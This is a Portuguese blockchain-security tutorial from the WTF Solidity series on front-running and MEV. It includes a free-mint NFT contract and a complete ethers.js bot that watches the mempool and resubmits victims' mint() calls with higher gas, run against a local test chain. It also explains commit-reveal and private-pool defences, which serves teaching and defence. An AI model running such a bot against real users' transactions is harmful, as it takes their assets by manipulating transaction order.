# S11. Front-running de Transações

Recentemente, tenho revisado meus conhecimentos em solidity para consolidar os detalhes e também escrever um "Guia Simplificado de Solidity" para iniciantes (os especialistas em programação podem procurar outros tutoriais), com atualizações semanais de 1 a 3 lições.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

Comunidade: [Discord](https://discord.gg/5akcruXrsk) | [Grupo do WeChat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link) | [Site oficial wtf.academy](https://wtf.academy)

Todo o código e tutoriais são de código aberto no GitHub: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

---

Nesta lição, vamos falar sobre o front-running de contratos inteligentes. Estima-se que arbitradores em Ethereum lucraram $1.2 bilhão através de ataques "sandwich" [fonte](https://dune.com/chorus_one/ethereum-mev-data).

## Front-running

### Front-running tradicional
O front-running surgiu inicialmente nos mercados financeiros tradicionais como uma competição puramente baseada no interesse pessoal. Nos mercados financeiros, a discrepância de informações deu origem a intermediários financeiros que podiam lucrar ao saberem primeiro de certas informações do setor e reagirem rapidamente. Esses ataques principalmente ocorrem em negociações de ações e em registros de domínios.

Em setembro de 2021, Nate Chastain, diretor de produto da OpenSea, foi descoberto lucrando ao comprar antecipadamente NFTs que seriam exibidos na página inicial da OpenSea.
Ele usava informações privilegiadas para obter uma vantagem desleal, sabendo quais NFTs a OpenSea promoveria na página inicial, ele comprava antes da exibição na página inicial para depois vendê-los quando os NFTs fossem para a página inicial. No entanto, uma pessoa conseguiu combinar o timestamp da transação do NFT com uma promoção suspeita de NFT na página inicial da OpenSea e descobriu essa atividade ilegal, levando Nate a ser processado.

Outro exemplo de front-running tradicional é quando há insider trading em tokens antes de serem listados em exchanges conhecidas como Binance e Coinbase. Após o anúncio de listagem, o preço do token tende a subir significativamente, e é nesse momento que os front-runners vendem para lucrar.

### Front-running em Blockchain

Front-running em blockchain refere-se a pesquisadores ou mineradores que inserem suas transações antes de outras, com o objetivo de capturar valor. Em blockchain, os mineradores têm a capacidade de aumentar o `gas` ou utilizar outros métodos para colocarem suas transações antes das demais e lucrarem com isso. No blockchain da Ethereum, o `MEV` mede esses lucros.

Geralmente, a maioria das transações de usuários são reunidas na Mempool antes de serem incluídas em um bloco na blockchain Ethereum. Os mineradores procuram priorizar transações com taxas mais altas para maximizarem seus lucros. Além disso, alguns robôs de `MEV` monitoram a Mempool em busca de transações lucrativas. Por exemplo, uma transação de troca (`swap`) em uma exchange descentralizada com um alto valor de deslizamento pode ser alvo de um ataque "sandwich": ajustando o `gas`, o negociante coloca uma ordem de compra antes e uma ordem de venda depois, lucrando com a diferença. Isso é semelhante à manipulação do preço de mercado.

![](./img/S11-1.png)

## Prática de Front-running

Se você dominar o front-running, será considerado um cientista do blockchain de nível iniciante. A seguir, vamos praticar um front-running ao uma transação de mint de um NFT. As ferramentas que utilizaremos são:
- A ferramenta `anvil` da `Foundry` para criar uma blockchain de teste local, certifique-se de instalar [foundry](https://book.getfoundry.sh/getting-started/installation) previamente.
- O `Remix` para implantação e mint do contrato NFT.
- Um script `etherjs` para escutar a Mempool e realizar o front-running.

**1. Inicializar uma blockchain de teste local com a Foundry:** Após ter instalado o `foundry`, na linha de comando, digite `anvil --chain-id 1234 -b 10` para criar uma blockchain de teste local, com chain-id 1234 e produzindo um bloco a cada 10 segundos. Após a inicialização bem sucedida, serão exibidos alguns endereços e chaves privadas de teste, cada conta com 10000 ETH. Você pode utilizá-las para testar.

**2. Conectar o Remix à blockchain de teste:** Acesse a página de implantação do Remix e no menu suspenso `Environment`, selecione `Foundry Provider` para conectar o Remix à blockchain de teste.

**3. Implante o contrato NFT:** No Remix, implante um contrato NFT de `freemint` (mint grátis). Esse contrato possui uma função `mint()` que permite o mint grátis de NFTs.

```solidity
// SPDX-License-Identifier: MIT
// By 0xAA
pragma solidity ^0.8.21;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// Tentaremos fazer um front-run de uma transação de mint gratuita
contract FreeMint is ERC721 {
    uint256 public totalSupply;

    // Construtor, inicializa o nome e símbolo da coleção de NFTs
    constructor() ERC721("Free Mint NFT", "FreeMint"){}

    // Função de mint
    function mint() external {
        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}
```

**4. Implante o script de front-running ethers.js:** Em resumo, o script `frontrun.js` escuta as transações pendentes na Mempool da blockchain de teste, filtra as transações que chamam a função `mint()` e, em seguida, replica e aumenta o `gas` para realizar o front-running. Se você não estiver familiarizado com `ether.js`, pode ler o [Guia Simplificado de Ethers da WTF](https://github.com/WTFAcademy/WTF-Ethers).

```js
// provider.on("pending", listener)
import { ethers, utils } from "ethers";

// 1. Criar o provider
var url = "http://127.0.0.1:8545";
const provider = new ethers.providers.WebSocketProvider(url);
let network = provider.getNetwork()
network.then(res => console.log(`[${(new Date).toLocaleTimeString()}] Conectado ao chain ID ${res.chainId}`));

// 2. Criar um objeto de interface para decodificar os detalhes da transação.
const iface = new utils.Interface([
    "function mint() external",
])

// 3. Criar uma carteira para enviar transações de front-running
const privateKey = '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a'
const wallet = new ethers.Wallet(privateKey, provider)

const main = async () => {
    // 4. Escutar as transações pendentes do mint, obter os detalhes da transação e decodificar.
    console.log("\n4. Escutar transações pendentes, obter o txHash e mostrar os detalhes da transação.")
    provider.on("pending", async (txHash) => {
        if (txHash) {
            // Obter detalhes da tx
            let tx = await provider.getTransaction(txHash);
            if (tx) {
                // Filtrar os dados da transação pendente
                if (tx.data.indexOf(iface.getSighash("mint")) !== -1 && tx.from != wallet.address ) {
                    // Mostrar o txHash
                    console.log(`\n[${(new Date).toLocaleTimeString()}] Escutando transação pendente: ${txHash} \r`);

                    // Mostrar os detalhes da transação decodificados
                    let parsedTx = iface.parseTransaction(tx)
                    console.log("Detalhes decodificados da transação pendente:")
                    console.log(parsedTx);
                    // Decodificar os dados da transação
                    console.log("Transação bruta")
                    console.log(tx);

                    // Construir a tx de front-running
                    const txFrontrun = {
                        to: tx.to,
                        value: tx.value,
                        maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 1.2,
                        maxFeePerGas: tx.maxFeePerGas * 1.2,
                        gasLimit: tx.gasLimit * 2,
                        data: tx.data
                    }
                    // Enviar a transação de front-running
                    var txResponse = await wallet.sendTransaction(txFrontrun)
                    console.log(`Realizando front-running da transação`)
                    await txResponse.wait()
                    console.log(`Transação de front-running bem-sucedida`)                
                }
            }
        }
    });

    provider._websocket.on("error", async () => {
        console.log(`Não foi possível conectar a ${ep.subdomain} Tente novamente em 3s...`);
        setTimeout(init, 3000);
      });

    provider._websocket.on("close", async (code) => {
        console.log(
            `Conexão perdida com o código ${code}! Tentando reconectar em 3s...`
        );
        provider._websocket.terminate();
        setTimeout(init, 3000);
    });    
};

main()
```

**5. Chamar a função `mint()`:** Na página de implantação do Remix, chame a função `mint()` do contrato Freemint para realizar o mint do NFT.

**6. O script detecta a transação e realiza o front-running:** No terminal, você verá que o script `frontrun.js` conseguiu detectar a transação e realizar o front-running com sucesso. Se você consultar a função `ownerOf()` do contrato NFT e verificar o tokenID 0, verá que o detentor é o endereço da carteira usada pelo script de front-running, confirmando o sucesso do front-running!.

![](./img/S11-4.png)

## Métodos de Prevenção

O front-running é um problema comum em blockchains públicas como Ethereum. Não podemos eliminá-lo, mas podemos reduzir os lucros do front-running ao minimizar a importância da ordem e do tempo das transações:

- Utilize um esquema de precompromisso (commit-reveal scheme).
- Utilize dark pools, onde as transações dos usuários não entram na Mempool pública, indo direto para os mineradores. Por exemplo, flashbots e TaiChi.

## Conclusão

Nesta lição, abordamos o conceito de front-running em Ethereum, uma prática também conhecida como arbitragem de informações. Esse tipo de ataque, originado no mercado financeiro tradicional, é mais fácil de ser realizado em blockchains devido à transparência das informações. Realizamos um exemplo de front-running no tempo: front-runnar uma transação de mint de um NFT. Quando transações semelhantes forem necessárias, é melhor adotar medidas como pools ocultos ou leilões em lote para evitar esse tipo de ataque. O front-running é um problema comum em blockchains públicas como Ethereum, mas podemos reduzir os lucros dos front-runners ao minimizar a importância da ordem e do tempo das transações.

